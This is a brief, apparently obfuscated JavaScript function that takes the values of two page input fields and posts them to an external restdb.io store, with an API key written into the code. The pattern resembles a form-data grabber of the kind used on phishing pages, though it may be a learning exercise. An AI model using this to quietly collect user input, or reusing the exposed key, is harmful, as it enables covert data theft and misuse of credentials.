var adfanb118 = "#test1";
var hag1t49108 = "#test2";





function aadfa1kabjkadbjka1() {


  var f123221 = $(adfanb118).val();
  var s44adfa14 = $(hag1t49108).val();

  var jsondata = {"c1": f123221,"c2": s44adfa14};


  var settings = {
    "async": true,
    "crossDomain": true,
    "url": "https://learn-29ef.restdb.io/rest/store",
    "method": "POST",
    "headers": {
      "content-type": "application/json",
      "x-apikey": "6001710c1346a1524ff12acc",
      "cache-control": "no-cache"
    },
    "processData": false,
    "data": JSON.stringify(jsondata)
  }
  console.log(JSON.stringify(jsondata));

  $.ajax(settings).done(function (response) {
    console.log(response);

  });
  
  console.log(JSON.stringify(jsondata));
  console.log(settings);

}


